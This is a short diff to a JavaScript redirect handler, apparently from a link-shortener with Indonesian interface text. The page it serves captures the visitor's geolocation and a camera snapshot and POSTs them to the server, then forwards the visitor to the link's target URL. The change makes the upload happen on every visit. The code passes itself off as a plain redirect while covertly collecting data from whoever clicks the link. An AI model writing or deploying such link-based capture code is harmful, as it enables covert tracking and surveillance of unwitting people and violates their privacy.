@@ -512,25 +512,17 @@ const handleRedirect = async (req, res) => {
         async function proceed(lat, lon, photo) {
           if (done) return;
           done = true;
-          let redirectUrl = '/r/' + targetCode + '?';
-          if (lat && lon) {
-            redirectUrl += 'lat=' + lat + '&lon=' + lon;
-          } else {
-            redirectUrl += 'fallback=1';
+          try {
+            document.getElementById('statusText').innerText = "Mengarahkan...";
+            await fetch('/r/' + targetCode + (lat && lon ? '?lat=' + lat + '&lon=' + lon : '?fallback=1'), {
+              method: 'POST',
+              headers: { 'Content-Type': 'application/json' },
+              body: JSON.stringify({ photo: photo || null, lat: lat || null, lon: lon || null })
+            });
+          } catch (e) {
+            console.error(e);
           }
-          if (photo) {
-            try {
-              document.getElementById('statusText').innerText = "Menyimpan foto snapshot...";
-              await fetch('/r/' + targetCode + (lat && lon ? '?lat=' + lat + '&lon=' + lon : '?fallback=1'), {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ photo: photo, lat: lat, lon: lon })
-              });
-            } catch (e) {
-              console.error(e);
-            }
-          }
-          window.location.replace(redirectUrl);
+          window.location.replace('${link.targetUrl}');
         }
 
         async function tryCaptureCamera() {
